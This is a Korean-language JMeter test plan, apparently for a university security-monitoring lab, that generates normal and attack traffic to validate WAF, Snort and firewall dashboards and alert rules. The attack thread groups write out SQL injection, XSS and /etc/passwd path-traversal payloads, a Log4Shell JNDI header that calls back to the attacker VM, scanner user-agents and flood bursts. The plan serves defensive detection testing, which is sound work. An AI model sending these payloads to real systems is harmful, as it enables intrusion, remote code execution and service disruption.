@@ -1,0 +1,317 @@
+# JMeter 트래픽 생성 요청서
+
+> 목적: 보안관제 대시보드 및 탐지 룰 검증을 위한 정상/공격 트래픽 생성
+> 작성일: 2026-03-31
+
+---
+
+## 1. 개요
+
+### 환경 구성
+
+```
+[JMeter 실행 위치]
+attacker_outer VM (192.168.88.10)
+        ↓
+[Sophos 1차 방화벽] → [pfSense + Snort IDS] → [WAF: 192.168.40.5]
+                                                        ↓
+                                              [WEB: 192.168.40.10]
+                                                        ↓
+                                              [WAS: 192.168.30.40]
+                                                        ↓
+                                              [DB: 192.168.30.10]
+```
+
+- **JMeter 실행 위치:** attacker_outer VM (192.168.88.10)
+- **요청 대상 서버:** WAF (192.168.40.5), 포트 80
+- **도메인:** www.kj.ac.kr (또는 IP 직접)
+
+### 각 요청이 지나는 경로에서 생성되는 로그
+
+| 로그 종류 | 생성 조건 | 연결 대시보드 |
+|---------|---------|------------|
+| 방화벽 로그 (Sophos 1차/pfSense) | 모든 트래픽 | D4 방화벽 |
+| Snort IDS 경보 | 공격 패턴 트래픽 | D3 Snort |
+| WAF 탐지/차단 로그 | 공격 페이로드 포함 요청 | D2 WAF |
+| Nginx 접근 로그 | WAF 통과한 정상 요청 | D5 Web |
+| WAS 로그 | 앱까지 도달한 요청 | D5 WAS |
+| DB 로그 | DB 쿼리 발생한 요청 | D5 DB |
+
+---
+
+## 2. Thread Group 구성
+
+총 **3개 Thread Group** 동시 실행
+
+---
+
+### Thread Group 1 — 정상 트래픽 (상시)
+
+| 항목 | 설정값 |
+|-----|-------|
+| Threads | 5 |
+| Ramp-up | 30초 |
+| Loop | Forever |
+| Think Time | 1~2초 (Random Timer) |
+| 목표 처리량 | 약 50 req/min |
+
+#### 요청 목록
+
+**① GET 게시글 목록**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts
+비율: 30%
+```
+
+**② GET 게시글 상세**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts/{1~20 랜덤}
+비율: 20%
+```
+
+**③ POST 로그인 (정상)**
+```
+Method: POST
+URL: http://192.168.40.5/api/auth/login
+Header: Content-Type: application/json
+Body: {"email": "user@kj.ac.kr", "password": "Password1!"}
+비율: 15%
+```
+
+**④ POST 게시글 작성**
+```
+Method: POST
+URL: http://192.168.40.5/api/board/posts
+Header: Content-Type: application/json
+        Authorization: Bearer {로그인 후 토큰}
+Body: {"title": "테스트 제목", "content": "일반 게시글 내용입니다."}
+비율: 15%
+```
+
+**⑤ GET 존재하지 않는 경로 (4xx 응답 유발)**
+```
+Method: GET
+URL: http://192.168.40.5/api/notfound
+     http://192.168.40.5/admin
+     http://192.168.40.5/test.php  (랜덤 선택)
+비율: 10%
+목적: D5 Web 4xx 로그 생성
+```
+
+**⑥ POST 로그인 실패 (WAS ERROR 로그 유발)**
+```
+Method: POST
+URL: http://192.168.40.5/api/auth/login
+Header: Content-Type: application/json
+Body: {"email": "notexist@kj.ac.kr", "password": "wrongpass"}
+비율: 10%
+목적: 인증 실패 → WAS ERROR/WARN 로그 생성 → D5 WAS 에러 메트릭
+```
+
+---
+
+### Thread Group 2 — 저강도 공격 트래픽 (상시)
+
+| 항목 | 설정값 |
+|-----|-------|
+| Threads | 1 |
+| Ramp-up | 10초 |
+| Loop | Forever |
+| Think Time | 20~30초 (Random Timer) |
+| 목표 처리량 | 약 2~3 req/min |
+
+> **※ 주의:** WAF(ModSecurity)가 공격 페이로드를 탐지/차단하므로 WAS/DB까지 도달하지 않음. HTTP 403 응답이 와도 WAF 로그는 정상 생성됨.
+
+#### 요청 목록 (순환 또는 랜덤)
+
+**① SQL Injection — 로그인 API**
+```
+Method: POST
+URL: http://192.168.40.5/api/auth/login
+Header: Content-Type: application/json
+Body: {"email": "' UNION SELECT 1,2,3--", "password": "test"}
+목적: [WAF] SQLi 탐지, [Snort] SQLi 탐지
+```
+
+**② SQL Injection — 게시판 검색**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts?keyword=' OR 1=1--
+목적: [WAF] SQLi 탐지
+```
+
+**③ XSS — 게시글 작성**
+```
+Method: POST
+URL: http://192.168.40.5/api/board/posts
+Header: Content-Type: application/json
+Body: {"title": "<script>alert('XSS')</script>", "content": "내용"}
+목적: [WAF] XSS 탐지, [Snort] XSS 탐지
+```
+
+**④ LFI (경로 탐색)**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts?file=../../../etc/passwd
+목적: [WAF] LFI 탐지, [Snort] LFI 탐지
+```
+
+**⑤ RCE — Log4Shell**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts
+Header: X-Api-Version: ${jndi:ldap://192.168.88.10/a}
+목적: [WAF] RCE 탐지, [Snort] RCE/Log4Shell 탐지
+```
+
+**⑥ 스캐너 User-Agent**
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts
+Header: User-Agent: sqlmap/1.0
+목적: [Snort] 스캐너 탐지
+```
+
+**⑦ 비정상 HTTP 메서드**
+```
+Method: PUT
+URL: http://192.168.40.5/api/auth/login
+Header: Content-Type: application/json
+Body: {"test": "data"}
+목적: [WAF] 우회/프로토콜 위반 탐지
+```
+
+---
+
+### Thread Group 3 — 버스트 공격 (주기적)
+
+> **Snort IDS 룰 중 일부는 "N초 안에 M건 이상"일 때만 경보를 발생시킴.**
+> 저강도 공격(TG2)만으로는 이 임계값을 넘지 못하므로 10~15분 간격으로 버스트 공격이 필요.
+
+#### 버스트 스케줄
+```
+10분 대기 → 버스트 A(30초) → 10분 대기 → 버스트 B(30초) → 10분 대기 → 버스트 C(30초) → 반복
+```
+
+JMeter 구현 방법:
+- `Flow Control Action (Pause)` 10분 → Sampler 실행 → 반복
+- 또는 `Throughput Controller`로 시간 간격 제어
+
+---
+
+**버스트 A — Flood 시뮬레이션** (Snort DoS/Flood + Sophos DoS 룰 트리거)
+
+| 항목 | 설정값 |
+|-----|-------|
+| Threads | 20 |
+| Ramp-up | 1초 |
+| Loop | 5회 |
+| Think Time | 없음 |
+| 목표 | 10초 안에 100건 이상 |
+
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts
+목적: [Snort] DoS/Flood 탐지 (1초 내 80건 이상 임계값)
+     [FW] Sophos DoS Threshold (5분 내 100건 denied)
+```
+
+---
+
+**버스트 B — 스캐너 반복** (Snort 스캐너 반복 룰 트리거)
+
+| 항목 | 설정값 |
+|-----|-------|
+| Threads | 1 |
+| Loop | 10회 |
+| Think Time | 5초 |
+
+```
+Method: GET
+URL: http://192.168.40.5/api/board/posts
+Header: User-Agent: nikto/2.1.6
+목적: [Snort] 스캐너 반복 탐지 (60초 내 5건 이상 임계값)
+```
+
+---
+
+**버스트 C — 비정의 포트 접근** (방화벽 ALL_DROP 트리거)
+
+| 항목 | 설정값 |
+|-----|-------|
+| Threads | 5 |
+| Loop | 5회 |
+| Think Time | 없음 |
+
+```
+URL: http://192.168.40.5:8443/test   (비정상 포트, 랜덤 선택)
+     http://192.168.40.5:9090/admin
+     http://192.168.40.5:3306/
+목적: [FW] ALL_DROP 발동 (5분 내 20건 이상 denied)
+※ 연결 자체가 거부되더라도 방화벽 차단 로그는 생성됨
+```
+
+---
+
+## 3. 전체 트래픽 요약
+
+| Thread Group | 유형 | req/min | 비율 |
+|-------------|------|---------|-----|
+| TG1 | 정상 | 50 | ~94% |
+| TG2 | 저강도 공격 | 2~3 | ~4% |
+| TG3 | 버스트 (평균화) | ~1 | ~2% |
+| **합계** | | **~53~54** | |
+
+---
+
+## 4. 실행 시간 권장
+
+| 목적 | 최소 시간 |
+|-----|---------|
+| 방화벽/WAF 로그 기본 확인 | 15분 |
+| 대시보드 시계열 차트 확인 | 30분 |
+| 탐지 룰 Alert 발동 확인 | 1~2시간 |
+| 발표용 전체 데이터 축적 | 하루 상시 |
+
+---
+
+## 5. 주의사항
+
+1. **WAF가 공격 요청을 차단하는 것은 정상** — HTTP 403 응답이 와도 로그는 찍힘
+2. **버스트 공격 시 Think Time 제거** — Snort detection_filter 임계값 돌파 필요
+3. **TG1 Think Time 반드시 설정** — 없으면 TG1 자체가 Flood로 탐지됨
+4. **Log4Shell 헤더 요청** — WAF가 즉시 차단하므로 HTTP 403 정상
+5. **버스트 C 포트 접근** — 연결 거부되더라도 방화벽 차단 로그는 생성됨
+
+---
+
+## 6. JMeter로 커버되는 대시보드 범위
+
+| 대시보드 | 커버 여부 | 비고 |
+|---------|---------|-----|
+| D1 인프라 | ✅ | JMeter 무관, 시스템 메트릭 자동 수집 |
+| D2 WAF | ✅ | TG2 공격으로 SQLi/XSS/LFI/RCE 커버 |
+| D3 Snort | ✅ | TG2/TG3으로 외부→WAF 구간 탐지 커버 |
+| D4 Sophos 1차/pfSense | ✅ | 모든 트래픽 통과 시 로그 생성 |
+| D5 Web (4xx/5xx) | ✅ | TG1 ⑤⑥번 요청으로 커버 |
+| D5 WAS/DB | ✅ | TG1 정상 요청이 WAS/DB까지 도달 |
+| D7 [WAF]/[Snort] Alert | ✅ | TG2/TG3 공격으로 탐지 룰 발동 |
+
+---
+
+## 7. JMeter만으로 커버되지 않는 항목 (별도 조치 필요)
+
+아래 항목들은 **외부(attacker_outer)에서 발생시키는 트래픽으로는 유발이 불가능**하며,
+내부 VM에서 직접 트래픽을 발생시켜야 해당 로그 및 탐지 룰이 동작함.
+
+| 항목 | 이유 | 유발 위치 |
+|-----|------|---------|
+| **D4 Sophos 2차 방화벽 로그** | Sophos 2차는 서버망(192.168.30.x) 앞단에 위치. 외부 트래픽은 WAF에서 차단되어 2차 방화벽까지 도달하지 않음 | WAS/DB VM 내부에서 발생시켜야 함 |
+| **[FW] DMZ→내부망 직접접근** | WAF/WEB 서버(DMZ)가 내부 서버망/SOC망으로 직접 접근을 시도해야 탐지됨 | WAF VM (192.168.40.5) 내부에서 `curl 192.168.99.10` 등 |
+| **[FW] 서버→외부 무단통신** | 내부 서버가 외부로 직접 통신을 시도해야 탐지됨 | WAS VM (192.168.30.40) 내부에서 외부 curl |
+| **[FW] DB/AD 직접접근** | WAS 외 다른 경로로 DB/AD에 접근해야 탐지됨 | WEB VM (192.168.40.10) 내부에서 DB IP 직접 접근 |
+| **[Snort] DMZ 횡이동 (priority:1)** | WAF/WEB 서버가 내부망을 스캔하는 패턴이어야 탐지됨 | WAF/WEB VM 내부에서 내부망 스캔 |
+
+위 항목은 각 VM에서 주기적으로 실행되는 간단한 스크립트(cron)로 별도 구성 예정.
